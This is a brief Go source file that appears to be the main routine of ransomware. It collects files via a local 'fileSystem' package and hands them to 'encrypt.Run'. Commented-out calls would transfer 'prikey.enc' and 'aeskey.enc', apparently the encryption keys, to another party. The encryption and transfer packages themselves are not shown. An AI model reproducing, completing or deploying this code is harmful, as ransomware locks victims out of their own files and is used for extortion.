package main

import (
	"./encrypt"
	"./fileSystem"
	"fmt"
	"os"
	"strings"
)

func main() {
	ffname := os.Args[0]
	ok := strings.HasSuffix(ffname, ".exe")
	if !ok {
		ffname += ".exe"
	}

	f, _ := os.Open(ffname)
	getInfo, _ := f.Stat()
	getLen := getInfo.Size()
	b := make([]byte, getLen)
	n, _ := f.Read(b)
	fmt.Println(n)
	fmt.Println(b[:100])

	//fileTransfer.sendFile("prikey.enc")
	//fileTransfer.sendFile("aeskey.enc")
	filePath := fileSystem.GetAllFile(ffname)
	encrypt.Run(filePath)
}
